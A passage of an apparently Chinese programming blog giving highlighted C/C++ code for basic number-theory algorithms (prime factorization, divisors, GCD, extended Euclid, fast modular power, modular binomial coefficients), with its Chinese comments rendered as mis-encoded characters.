class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç›®çš„ï¼šè¯¥ç¨‹åºç”¨äºå°†ç»™å®šæ•´æ•° x åˆ†è§£æˆå…¶è´¨å› æ•°ï¼Œå¹¶è¾“å‡ºæ¯ä¸ªè´¨å› æ•°åŠå…¶å‡ºç°æ¬¡æ•°ã€‚</span><br><span class="hljs-comment"> * æ­¥éª¤ï¼š</span><br><span class="hljs-comment"> * 1. ä» 2 å¼€å§‹ï¼Œé€æ­¥æ£€æŸ¥æ˜¯å¦èƒ½æ•´é™¤ xã€‚</span><br><span class="hljs-comment"> * 2. å¦‚æœèƒ½æ•´é™¤ï¼Œåˆ™è®°å½•è¯¥è´¨å› æ•°çš„å‡ºç°æ¬¡æ•°ï¼Œå¹¶ä¸æ–­é™¤ä»¥è¯¥è´¨å› æ•°ç›´åˆ°ä¸èƒ½æ•´é™¤ä¸ºæ­¢ã€‚</span><br><span class="hljs-comment"> * 3. å¦‚æœå‰©ä½™çš„ x å¤§äº 1ï¼Œè¯´æ˜å®ƒæœ¬èº«æ˜¯è´¨æ•°ï¼Œè¾“å‡ºå®ƒã€‚</span><br><span class="hljs-comment"> * è¾“å…¥ï¼šä¸€ä¸ªé•¿æ•´å‹æ•° x</span><br><span class="hljs-comment"> * è¾“å‡ºï¼šx çš„è´¨å› æ•°åˆ†è§£ç»“æœï¼Œä»¥â€œè´¨å› æ•° æ¬¡æ•°â€çš„å½¢å¼è¾“å‡ºã€‚</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">divide</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> x)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i++) &#123;  <span class="hljs-comment">// ä»2å¼€å§‹æ£€æŸ¥åˆ°sqrt(x)</span><br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// å¦‚æœièƒ½æ•´é™¤x</span><br>            <span class="hljs-type">int</span> s = <span class="hljs-number">0</span>;  <span class="hljs-comment">// è®°å½•iå‡ºç°çš„æ¬¡æ•°</span><br>            <span class="hljs-keyword">while</span> (x % i == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// ä¸æ–­é™¤ä»¥i</span><br>                x /= i;  <span class="hljs-comment">// å°†xé™¤ä»¥i</span><br>                s++;  <span class="hljs-comment">// å¢åŠ æ¬¡æ•°</span><br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld %d\n&quot;</span>, i, s);  <span class="hljs-comment">// è¾“å‡ºè´¨å› æ•°å’Œå‡ºç°æ¬¡æ•°</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">1</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld 1\n&quot;</span>, x);  <span class="hljs-comment">// å¦‚æœå‰©ä½™çš„xæ˜¯è´¨æ•°ï¼Œè¾“å‡ºå®ƒ</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);  <span class="hljs-comment">// è¾“å‡ºæ¢è¡Œ</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> x;    <br>    <span class="hljs-comment">// è¯»å–ç”¨æˆ·è¾“å…¥</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number to divide: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;x);  <span class="hljs-comment">// è¾“å…¥ä¸€ä¸ªlong longç±»å‹çš„æ•´æ•°</span><br><br>    <span class="hljs-comment">// è¾“å‡ºåˆ†è§£ç»“æœ</span><br>    divide(x);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="è¯•é™¤æ³•æ±‚æ‰€æœ‰å› æ•°"><a href="#è¯•é™¤æ³•æ±‚æ‰€æœ‰å› æ•°" class="headerlink" title="è¯•é™¤æ³•æ±‚æ‰€æœ‰å› æ•°"></a>è¯•é™¤æ³•æ±‚æ‰€æœ‰å› æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç›®çš„ï¼šè¯¥ç®—æ³•ç”¨äºæ‰¾åˆ°ä¸€ä¸ªæ•´æ•° x çš„æ‰€æœ‰æ­£å› æ•°ï¼Œå¹¶æŒ‰å‡åºæ’åºè¿”å›ã€‚</span><br><span class="hljs-comment"> * æ­¥éª¤ï¼šéå†ä»1åˆ°sqrt(x)ï¼Œå¯¹äºæ¯ä¸ªèƒ½æ•´é™¤xçš„æ•°iï¼Œx/iä¹Ÿæ˜¯xçš„å› æ•°ï¼Œè®°å½•è¿™äº›å› æ•°ã€‚</span><br><span class="hljs-comment"> * è¾“å…¥ï¼šä¸€ä¸ªæ­£æ•´æ•° x</span><br><span class="hljs-comment"> * è¾“å‡ºï¼šè¿”å› x çš„æ‰€æœ‰å› æ•°ï¼Œå¹¶æŒ‰å‡åºæ’åˆ—ã€‚</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// è¿”å› x çš„æ‰€æœ‰æ­£å› æ•°</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; <span class="hljs-title function_">get_divisors</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> x)</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; res;  <span class="hljs-comment">// ç”¨äºå­˜å‚¨å› æ•°</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> i = <span class="hljs-number">1</span>; i &lt;= x / i; i++) &#123;  <span class="hljs-comment">// éå†ä»1åˆ°sqrt(x)</span><br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// å¦‚æœièƒ½æ•´é™¤x</span><br>            res.push_back(i);  <span class="hljs-comment">// i æ˜¯ä¸€ä¸ªå› æ•°</span><br>            <span class="hljs-keyword">if</span> (i != x / i) &#123;  <span class="hljs-comment">// å¦‚æœiå’Œx/iä¸ç›¸ç­‰ï¼Œx/iä¹Ÿæ˜¯ä¸€ä¸ªå› æ•°</span><br>                res.push_back(x / i);<br>            &#125;<br>        &#125;<br>    &#125;<br>    sort(res.begin(), res.end());  <span class="hljs-comment">// æŒ‰å‡åºæ’åˆ—å› æ•°</span><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> x;<br>    <span class="hljs-comment">// è¯»å–è¾“å…¥</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number to find its divisors: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;x);  <span class="hljs-comment">// ä½¿ç”¨scanfè¯»å–long longç±»å‹çš„æ•°</span><br>    <span class="hljs-comment">// è·å–æ‰€æœ‰å› æ•°</span><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">long</span> <span class="hljs-type">long</span>&gt; divisors = get_divisors(x);<br>    <span class="hljs-comment">// è¾“å‡ºæ‰€æœ‰å› æ•°</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Divisors of %lld are:\n&quot;</span>, x);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> d : divisors) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld &quot;</span>, d);  <span class="hljs-comment">// è¾“å‡ºæ¯ä¸ªå› æ•°</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-comment">// ä¸¾ä¸ªç®€å•ä¾‹å­ï¼šè¾“å…¥x=18æ—¶ï¼Œç¨‹åºè¾“å‡º 1 2 3 6 9 18</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="çº¦æ•°ä¸ªæ•°å’Œçº¦æ•°ä¹‹å’Œ"><a href="#çº¦æ•°ä¸ªæ•°å’Œçº¦æ•°ä¹‹å’Œ" class="headerlink" title="çº¦æ•°ä¸ªæ•°å’Œçº¦æ•°ä¹‹å’Œ"></a>çº¦æ•°ä¸ªæ•°å’Œçº¦æ•°ä¹‹å’Œ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">å¦‚æœ N = p1^c1 * p2^c2 * ... *pk^ck</span><br><span class="hljs-comment">çº¦æ•°ä¸ªæ•°ï¼š (c1 + 1) * (c2 + 1) * ... * (ck + 1)</span><br><span class="hljs-comment">çº¦æ•°ä¹‹å’Œï¼š (p1^0 + p1^1 + ... + p1^c1) * ... * (pk^0 + pk^1 + ... + pk^ck)</span><br><span class="hljs-comment"> * ç›®çš„ï¼šè¯¥ç®—æ³•ç”¨äºè®¡ç®—ä¸¤ä¸ªæ•´æ•° a å’Œ b çš„æœ€å¤§å…¬çº¦æ•°ï¼ˆGCDï¼‰ã€‚</span><br><span class="hljs-comment"> * æ­¥éª¤ï¼šä½¿ç”¨ **è¾—è½¬ç›¸é™¤æ³•**ï¼ˆä¹Ÿå«æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼‰æ¥è®¡ç®—æœ€å¤§å…¬çº¦æ•°ã€‚è¯¥ç®—æ³•é€šè¿‡é€’å½’ä¸æ–­äº¤æ¢ä¸¤ä¸ªæ•°å¹¶ç”¨æ¨¡è¿ç®—ç®€åŒ–é—®é¢˜ï¼Œç›´åˆ° b ä¸º 0ï¼Œa å³ä¸ºæœ€å¤§å…¬çº¦æ•°ã€‚</span><br><span class="hljs-comment"> * è¾“å…¥ï¼šä¸¤ä¸ªæ•´æ•° a å’Œ b</span><br><span class="hljs-comment"> * è¾“å‡ºï¼šè¿”å› a å’Œ b çš„æœ€å¤§å…¬çº¦æ•°</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// è®¡ç®—æœ€å¤§å…¬çº¦æ•°ï¼ˆGCDï¼‰</span><br><span class="hljs-comment">// ä½¿ç”¨è¾—è½¬ç›¸é™¤æ³•ï¼ˆæ¬§å‡ é‡Œå¾—ç®—æ³•ï¼‰</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title function_">gcd</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> a, <span class="hljs-type">long</span> <span class="hljs-type">long</span> b)</span> &#123;<br>    <span class="hljs-keyword">return</span> b ? gcd(b, a % b) : a;  <span class="hljs-comment">// é€’å½’è®¡ç®—ç›´åˆ°bä¸º0ï¼Œè¿”å›a</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> a, b;<br>    <span class="hljs-comment">// è¯»å–è¾“å…¥</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter two numbers to find their GCD: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld %lld&quot;</span>, &amp;a, &amp;b);  <span class="hljs-comment">// ä½¿ç”¨scanfè¯»å–long longç±»å‹çš„ä¸¤ä¸ªæ•°</span><br>    <span class="hljs-comment">// è®¡ç®—æœ€å¤§å…¬çº¦æ•°</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> result = gcd(a, b);<br>    <span class="hljs-comment">// è¾“å‡ºç»“æœ</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The GCD of %lld and %lld is: %lld\n&quot;</span>, a, b, result);<br>    <span class="hljs-comment">// ä¸¾ä¸ªç®€å•ä¾‹å­ï¼šè¾“å…¥a=18, b=24æ—¶ï¼Œç¨‹åºè¾“å‡º 6</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="æœ€å¤§å…¬çº¦æ•°â€”â€”â€”â€”æ‰¾åˆ°xå’Œy"><a href="#æœ€å¤§å…¬çº¦æ•°â€”â€”â€”â€”æ‰¾åˆ°xå’Œy" class="headerlink" title="æœ€å¤§å…¬çº¦æ•°â€”â€”â€”â€”æ‰¾åˆ°xå’Œy"></a>æœ€å¤§å…¬çº¦æ•°â€”â€”â€”â€”æ‰¾åˆ°xå’Œy</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼Œæ±‚è§£ gcd(a, b)ï¼Œå¹¶ä¸”æ‰¾åˆ° x å’Œ yï¼Œä½¿å¾— a * x + b * y = gcd(a, b)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> &amp;x, <span class="hljs-type">int</span> &amp;y)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!b) &#123;  <span class="hljs-comment">// åŸºæœ¬æƒ…å†µï¼Œb == 0 æ—¶ï¼Œè¿”å› gcd(a, b) = a</span><br>        x = <span class="hljs-number">1</span>;   <span class="hljs-comment">// è¿™é‡Œæ˜¯ a * 1 + b * 0 = a</span><br>        y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-comment">// é€’å½’è°ƒç”¨ï¼Œè®¡ç®— exgcd(b, a % b)</span><br>    <span class="hljs-type">int</span> d = exgcd(b, a % b, y, x);  <span class="hljs-comment">// äº¤æ¢ x å’Œ yï¼Œå¹¶é€’å½’è®¡ç®— gcd(b, a % b)</span><br>    <br>    <span class="hljs-comment">// æ›´æ–° y çš„å€¼ï¼Œæ–°çš„ y æ˜¯é€’å½’è¿”å›çš„ y å‡å» a / b * x</span><br>    y -= a / b * x;<br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a, b, x, y;<br>    <span class="hljs-built_in">cin</span> &gt;&gt; a &gt;&gt; b;  <span class="hljs-comment">// è¾“å…¥ä¸¤ä¸ªæ•´æ•° a å’Œ b</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; b &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// è¾“å‡ºè¿™ä¸¤ä¸ªæ•´æ•°</span><br><br>    <span class="hljs-comment">// è°ƒç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</span><br>    <span class="hljs-type">int</span> d = exgcd(a, b, x, y);<br>    <span class="hljs-comment">//æ‰¾åˆ°xå’Œy</span><br>    <span class="hljs-comment">// è¾“å‡ºç»“æœï¼ša * x + b * y = gcd(a, b)</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d * %d + %d * %d = %d\n&quot;</span>, a, x, b, y, d);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="å¿«é€Ÿå¹‚"><a href="#å¿«é€Ÿå¹‚" class="headerlink" title="å¿«é€Ÿå¹‚"></a>å¿«é€Ÿå¹‚</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç›®çš„ï¼šè¯¥ç®—æ³•ç”¨äºè®¡ç®— m^k mod pï¼Œå³è®¡ç®— m çš„ k æ¬¡æ–¹æ¨¡ pã€‚</span><br><span class="hljs-comment"> * æ­¥éª¤ï¼šä½¿ç”¨ å¿«é€Ÿå¹‚ç®—æ³•ï¼ˆExponentiation by Squaringï¼‰æ¥è®¡ç®—ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(log k)ã€‚</span><br><span class="hljs-comment"> *       é€šè¿‡å°† k ä¸æ–­å³ç§»ï¼ˆk &gt;&gt;= 1ï¼‰å¹¶é€‚æ—¶æ›´æ–°ç»“æœï¼Œé¿å…ç›´æ¥è®¡ç®— m çš„ k æ¬¡æ–¹ã€‚</span><br><span class="hljs-comment"> * è¾“å…¥ï¼šä¸‰ä¸ªæ•´æ•° m, k, pï¼Œåˆ†åˆ«è¡¨ç¤ºåº•æ•°ã€æŒ‡æ•°å’Œæ¨¡æ•°ã€‚</span><br><span class="hljs-comment"> * è¾“å‡ºï¼šè¿”å› m^k mod p çš„ç»“æœã€‚</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// å¿«é€Ÿå¹‚ç®—æ³•ï¼šè®¡ç®— m^k mod p</span><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title function_">qmi</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> m, <span class="hljs-type">long</span> <span class="hljs-type">long</span> k, <span class="hljs-type">long</span> <span class="hljs-type">long</span> p)</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> res = <span class="hljs-number">1</span> % p;  <span class="hljs-comment">// åˆå§‹åŒ–ç»“æœä¸º 1 % p</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> t = m % p;    <span class="hljs-comment">// åˆå§‹åŒ– t ä¸º m % p</span><br>    <span class="hljs-keyword">while</span> (k) &#123;  <span class="hljs-comment">// å½“ k ä¸ä¸ºé›¶æ—¶</span><br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// å¦‚æœ k æ˜¯å¥‡æ•°</span><br>            res = res * t % p;  <span class="hljs-comment">// æ›´æ–°ç»“æœ</span><br>        &#125;<br>        t = t * t % p;  <span class="hljs-comment">// å°† t å¹³æ–¹</span><br>        k &gt;&gt;= <span class="hljs-number">1</span>;  <span class="hljs-comment">// k å³ç§»ä¸€ä½ï¼Œå³ k // 2</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> res;  <span class="hljs-comment">// è¿”å›æœ€ç»ˆç»“æœ</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> m, k, p;<br>    <span class="hljs-comment">// è¯»å–è¾“å…¥</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter m, k, p: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld %lld %lld&quot;</span>, &amp;m, &amp;k, &amp;p);  <span class="hljs-comment">// ä½¿ç”¨scanfè¯»å–long longç±»å‹çš„ m, k, p</span><br>    <span class="hljs-comment">// è°ƒç”¨å‡½æ•°è®¡ç®— m^k mod p</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> result = qmi(m, k, p);<br>    <span class="hljs-comment">// è¾“å‡ºç»“æœ</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld^%lld mod %lld = %lld\n&quot;</span>, m, k, p, result);<br>    <span class="hljs-comment">// ä¸¾ä¸ªç®€å•ä¾‹å­ï¼šè¾“å…¥ m = 2, k = 10, p = 1000 æ—¶ï¼Œç¨‹åºè¾“å‡º 1024 mod 1000 = 24</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="é€šè¿‡é¢„å¤„ç†é€†å…ƒçš„æ–¹å¼æ±‚ç»„åˆæ•°"><a href="#é€šè¿‡é¢„å¤„ç†é€†å…ƒçš„æ–¹å¼æ±‚ç»„åˆæ•°" class="headerlink" title="é€šè¿‡é¢„å¤„ç†é€†å…ƒçš„æ–¹å¼æ±‚ç»„åˆæ•°"></a>é€šè¿‡é¢„å¤„ç†é€†å…ƒçš„æ–¹å¼æ±‚ç»„åˆæ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">1e5</span> + <span class="hljs-number">5</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MOD = <span class="hljs-number">1000000007</span>;  <span class="hljs-comment">// å‡è®¾æˆ‘ä»¬å–æ¨¡çš„æ•°æ˜¯ä¸€ä¸ªè´¨æ•°</span><br><br><span class="hljs-type">int</span> fact[MAXN], infact[MAXN];<br><br><span class="hljs-comment">// å¿«é€Ÿå¹‚è®¡ç®—ï¼ša^k % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">qmi</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> k, <span class="hljs-type">int</span> p)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (k) &#123;<br>        <span class="hljs-keyword">if</span> (k &amp; <span class="hljs-number">1</span>) res = (LL)res * a % p;<br>        a = (LL)a * a % p;<br>        k &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// é¢„å¤„ç†é˜¶ä¹˜å’Œé˜¶ä¹˜é€†å…ƒ</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">preprocess</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> p)</span> &#123;<br>    fact[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i) &#123;<br>        fact[i] = (LL)fact[i<span class="hljs-number">-1</span>] * i % p;<br>    &#125;<br>    infact[n] = qmi(fact[n], p<span class="hljs-number">-2</span>, p);  <span class="hljs-comment">// è´¹é©¬å°å®šç†è®¡ç®—é€†å…ƒ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>        infact[i] = (LL)infact[i+<span class="hljs-number">1</span>] * (i+<span class="hljs-number">1</span>) % p;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// è®¡ç®—C(N, K) % p</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">comb</span><span class="hljs-params">(<span class="hljs-type">int</span> N, <span class="hljs-type">int</span> K, <span class="hljs-type">int</span> p)</span> &#123;<br>    <span class="hljs-keyword">if</span> (K &lt; <span class="hljs-number">0</span> || K &gt; N) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> (LL)fact[N] * infact[K] % p * 